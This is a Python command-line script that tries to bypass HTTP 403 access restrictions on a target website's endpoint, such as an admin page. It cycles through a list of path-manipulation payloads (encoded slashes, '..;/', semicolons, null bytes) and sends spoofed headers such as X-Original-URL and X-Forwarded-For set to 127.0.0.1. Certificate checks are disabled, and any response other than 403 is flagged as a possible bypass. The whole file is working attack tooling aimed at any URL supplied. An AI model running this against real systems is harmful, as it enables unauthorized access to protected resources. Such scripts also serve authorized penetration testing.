import requests
import sys

requests.packages.urllib3.disable_warnings()

payloads = [
    "/?",
    "//",
    "///",
    "/./",
    "?",
    "??",
    "/?/",
    "/??",
    "/??/",
    "/..",
    "/../",
    "/./",
    "/.",
    ".//",
    "/*",
    "//*",
    "/%2f",
    "/%2f/",
    "/%20",
    "/%20/",
    "/%09",
    "/%09/",
    "/%0a",
    "/%0a/",
    "/%0d",
    "/%0d/",
    "/%25",
    "/%25/",
    "/%23",
    "/%23/",
    "/%26",
    "/%3f",
    "/%3f/",
    "/#",
    "/#/",
    "/#/./",
    "/./",
    "/./",
    "/..;/",
    "/..;/",
    "/.;/",
    "/.;/",
    "/;/",
    "/;/",
    "//;//",
    "//;//",
    "/%2e/",
    "/%2e/",
    "/%20/%20",
    "/%20/%20/",
    "/..;/",
    ".json",
    "/.json",
    "..;/",
    ";/",
    "%00",
    ".css",
    ".html",
    "?id=1",
    "~",
    "/~",
    "/°/",
    "/&",
    "/-",
    "\\\\",
    "/..%3B/",
    "/;%2f..%2f..%2f",
    "",
    "/",
    "/..\\;/",
    "/*/",
    "/*/",
    "/+",
    "/+/"
]

def bypass_403(base_url, endpoint):
    endpoint = endpoint.strip("/")

    headers = {
        "User-Agent": "Mozilla/5.0 (403-bypass-test)",
        "X-Original-URL": f"/{endpoint}",
        "X-Rewrite-URL": f"/{endpoint}",
        "X-Forwarded-For": "127.0.0.1",
        "X-Host": "127.0.0.1",
        "X-Custom-IP-Authorization": "127.0.0.1",
        "X-Remote-IP": "127.0.0.1",
        "X-Forwarded-Host": "localhost"
    }

    for payload in payloads:
        try:
            full_path = f"/{endpoint}{payload}"
            full_url = base_url + full_path

            r = requests.get(
                full_url,
                headers=headers,
                timeout=10,
                verify=False,
                allow_redirects=False
            )

            status = r.status_code
            length = len(r.text)

            if status != 403:
                print(f"[+] POSSIBLE BYPASS {status} | {length} bytes | {full_url}")
            else:
                print(f"[-] 403 | {full_url}")

        except Exception as e:
            print(f"[!] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 403_bypass.py https://target.com endpoint")
        print("Example: python3 403_bypass.py https://target.com admin")
        sys.exit(1)

    base_url = sys.argv[1].rstrip("/")
    endpoint = sys.argv[2]

    bypass_403(base_url, endpoint)